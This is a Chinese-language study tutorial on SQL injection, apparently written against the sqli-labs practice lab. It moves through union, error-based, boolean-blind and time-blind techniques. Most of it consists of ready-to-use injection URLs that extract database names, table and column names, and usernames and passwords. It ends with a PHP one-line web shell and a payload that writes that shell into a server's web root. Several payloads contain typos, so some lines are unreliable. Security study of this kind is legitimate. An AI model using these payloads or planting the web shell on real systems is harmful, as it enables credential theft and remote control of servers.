sql注入基础

什么是注入

  • 所谓sql注入,就是通过把sql命令插入到web表单提交或输入域名或页面请求的查询字符串,最终达到欺骗服务器执行恶意的sql命令,从而进一步得到相应的数据信息.

注入分类

  • 按照查询字段
    • 字符型: 当输入的参数为字符串时,称为字符型注入
    • 数字型: 当输入的参数为整形时,可以认为是数字型注入
  • 按照注入方式
    • union注入
    • 报错注入
    • 布尔注入
    • 时间注入

注入点

  • 注入点就是可以实行注入的地方,通常是一个访问数据库的连接
  • 如果可以在网址后面加上id='字符'这种,绝对是字符型注入,如果是数字则不能直接判断
    • 可以在id=1后面加上and 1=2,即?id=1 and 1=2如果报错则是数字型,没报错是字符型
    • 也可以输入id=2-1,看结果是否与id=1相等,id=2-1字符型查出来的结果还是2
    • 原因: 字符型会把后面看做是整个字符,所以是’1=2’字符,就不会报错

闭合方式

  • ’
  • "
  • ')
  • ")
  • '))
  • 其他

判断闭合方式

  • less-1 输入id=1''',报错为near 1''''多一个’,闭合符为’

闭合的作用

  • 手工提交闭合符号,结束前一段查询语句,后面即可加入其他语句,查询需要的参数,不需要的语句可以用注释符号 --+ 或 '#' 或'%23'注释掉(跟环境有关) #注释掉: 利用注释符号暂时将程序段脱离运行,把某段程序"注释掉",就是让它暂时不运行(而非删除)

字符型union 注入

  • 查询语句: select列名 +from表名 +where限定语句

了解数据库

  • information_schema: 包含所有mysql数据库的简要信息
    • 其中包含有两个所需数据库tables(表名集合表)以及columns(列名数据库)
    • 每个sql数据库里面都有这个数据表
  • table_schema: 在tables和columns里面记录着所有的表名或列名
  • information_schema.schemata: 记录了所有的库名

实例分析

  • `?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=‘security’ --+ #在数据库information_schema的tables里面找到security的表,把他全部的表信息联合成一行然后回显
    • information_schema.tables的意思是去数据库的tables表里进行操作,限定范围
    • 如果显示不存在的表,则替换成database() #替换的话会将你所在数据库的

报错注入(0x7e的意思就是~)

  • floor()报错
  • extractvalue()报错
  • updatexml()报错

什么是报错注入

  • 后台对于输入输出的合理性没有检查
  • 构造语句,让错误信息夹杂可以显示数据库内容的查询语句

extractvalue报错

  • 找到报错类型(一般只能返回32个字符,用substring函数解决)
  • extractvalue实例:?id=100’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema= database()))) --+
  • 查库名,表名
  • 查账户和密码
    `?id=1’ union select 1,2,extracvalue(1,concat(0x7e,substring((select group_concat(username,password)from users),0,30))) --+

updatexml报错

  • updatexml函数(引起报错的是第二个参数)
  • updatexml(XML_document,XPath_string,new_value)
  • XML_document: 是string格式,为XML文档对象的名称,例如Doc
  • XPath_string: 是路径,XPath格式的字符串
  • new_value: string格式,替换查找到的符合条件的数据

updatexml报错原理

  • 系统对路径的字符敏感,报错会将敏感信息输出
  • 查库名
    • ?id=1" and 1=updatexml(1,concat('~',select database())),3) --+
  • 查表名
    • ?id=1" and 1=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+
  • 查列名
    • ?id=1" and 1=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()and table_name='users')),3) --+
  • 查核心数据
    • id=1" and 1=updatexml(1,concat(0x7e,(select substring(group_concat(username,password),1,30) from users)),3) --+

floor 报错注入

涉及的函数

  • rand()函数: 随机返回0~1间的小数
  • floor()函数: 小数向下取整数.向上取整数ceiling()
  • concat_ws(1,2,3)函数: 将括号内2,3的数据用1连接起来
  • group by子句: 分组语句,常用于,结合统计函数,根据一个或者多个列,对结果集进行分组
  • as: 别名
  • count()函数: 汇总统计数量
  • limit: 这里用于显示指定行数

floor报错例子

  • select count(*),concat_ws('_',(select database()),floor(rand(0)*2)) as a from users group by a; # from users的作用是让rand()产生足够多次数的计算,一般使用行数较多的默认数据表infromation_schema.tables
  • select count(*), concat_ws('_',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from users group by a; #如果group_concat无法显示,可以尝试concat
  • `?id=0’ union select 1, count(*),concat_ws(‘-’,(select concat(‘~’,id,username,‘:’,password)from users limit 0,1),floor(rand(0)*2))as a from information_schema.tables group by a --+ #limit 0,1 从0开始显示第1行

盲注

页面没有报错回显,不知带数据库具体返回值的情况下,对数据库中的内容进行猜解,实行sql注入

  • 分类: 布尔盲注,时间盲注,报错盲注

布尔盲注

  • web页面只返回True真,False假两种类型.利用页面返回不同,逐个猜解数据

  • 关键函数

  • ascii(): ascii美国信息交换标准代码,可以把字母转换成对应数字

    • select ascii('e');

  • substr((),1,1): 从第1个字符开始,显示1个字符 #select ascii(substr((database)1,1));

  • limit 0,1: 从第0行开始显示1行

  • 为什么要把字母转换为数字?

    • 查询命令可以执行,但不会返回信息到页面
布尔盲注步骤(小写字母ascii在100-120之间)
  • 查数据库名长度?id=1 and length(database())=i #i是长度
  • 查数据库`select ascii(subsrt(select database()),1,1)>=100;
  • 查表名 ?id=1' and acsii(substr((select table_name from information_schema.tables where table_schema=database()limit,0,1),1,1))>=100 --+
  • 查列名?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users'limit 0,1),1,1))>=100 --+
  • 查用户名?id=1' and ascii(substr((select username from users limit 0,1),1,1))>100 --+
  • 查密码?id=1' and ascii(substr((select password from users limit 0,1),1,1))>100 --+

时间盲注

  • web页面只返回一个正常页面,利用页面响应时间不同,组个猜解数据(前提是数据库会执行命令代码,只是不反馈页面信息)
  • 关键函数
  • sleep(); 参数为休眠时长,以秒为单位,可以为小数
    • select sleep(2);
  • if(condition,true,false) condition为条件,ture当条件为真时返回的值,false为条件为假时返回的值
    • select if(1=1,sleep(0),sleep(3)); # 1=1为真,执行休眠0秒
    • select if(1=2,sleep(0),sleep(3)); # 1=2为假,执行休眠3秒
  • 利用sleep函数判断闭合方式 #?id=1" and sleep(2) --+

msql文件上传要点

  • show variables like ‘%secure%’; 用来查看mysql是否有读写文件权限
    • 主要看secure_file_priv, 如果是空的,则具备读写权限
    • 如果写了某个盘,则说明只能在该盘下去写
    • 如果是null,则说明不可以读写
  • into outfile 命令使用的环境: 必须知道一个,服务器上可以写入文件夹的完整路径
  • 一句话木马: <?php @eval($_POST['password']);?>
  • ?id=-1')) union select 1,"<?php @eval($_POST['password']);?>" ,3 into outfile "D:\\phpstudy_pro\\WWW\\ben.php" --+ #pasword为预留密码 D:\phpstudy_pro\WWW为路径 ben.php为新插入的文件名
